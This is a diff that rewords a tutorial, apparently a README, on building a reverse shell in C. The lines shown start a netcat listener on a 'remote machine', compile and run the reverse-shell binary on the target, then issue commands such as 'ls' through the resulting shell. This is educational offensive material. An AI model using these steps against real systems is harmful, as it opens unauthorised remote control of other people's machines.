@@ -74,7 +74,7 @@ Starting with the **reverse-shell** since the code is smaller, this is the equiv
         return 0;
     }
 
-Start a listener on the remote machine 192.168.10.12
+Start a listener on the remote machine 192.168.10.12. I am using openbsd-netcat.
 
     remote:$ nc -l 4444
 
@@ -83,7 +83,7 @@ Compile and run the reverse-shell program
     target:$ gcc main.c -o rshell
     target:$ ./rshell
 
-Then on the remote machine start a listener. I am using openbsd-netcat.
+Then on the remote machine in the shell you started the listener you can now run commands on the target
 
     remote:$ nc -l 4444
     ls
